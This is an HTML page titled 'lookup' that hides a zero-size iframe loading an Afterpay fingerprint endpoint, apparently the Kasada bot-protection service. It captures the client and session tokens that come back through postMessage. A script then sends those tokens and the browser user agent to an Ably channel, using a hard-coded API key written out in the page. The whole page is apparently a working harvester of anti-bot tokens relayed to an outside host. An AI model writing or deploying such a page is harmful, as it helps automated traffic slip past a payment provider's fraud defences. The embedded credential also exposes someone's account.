<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="referrer" content="never">
    <title>lookup</title>
</head>
<body>
    <iframe
        src="https://merchantportalapi.afterpay.com/149e9513-01fa-4fb0-aad4-566afd725d1b/2d206a39-8ed7-437e-a3be-862e0f06eea3/fp?x-kpsdk-v=j-0.0.0"
        style="width: 0px; height: 0px; border: 0px none; display: none;" class="afterpay" referrerpolicy="no-referrer">
    </iframe>
    <div class="box"></div>
    <script>
        async function postdata(data) {
            let apikey = btoa("KohC8g.-zYthw:SHgSNZwVmhVdVesU-xR6JqB-6uj0lxeNCH6WWMDXKUs");
    		let res = await fetch("https://rest.ably.io/channels/afterpay/messages", {
    			method: "POST",
    			headers: {
    				"Content-Type": "application/json",
    				Authorization: `Basic ${apikey}`
    			},
    			body: JSON.stringify(data)
    		});
    		return await res.json()
    	}
        window.addEventListener('message', async (msg) => {
    		let [, , ct, , , , st, flag] = msg.data.split(":");
    		let u = `${ct}|${st}|${navigator.userAgent}`;
    		flag && (await postdata({
    			name: navigator.userAgent,
    			clientId: ct,
    			id: st
    		}), document.querySelector('div.box').innerText = btoa(u));
    	}, false);
    </script>
</body>
</html>
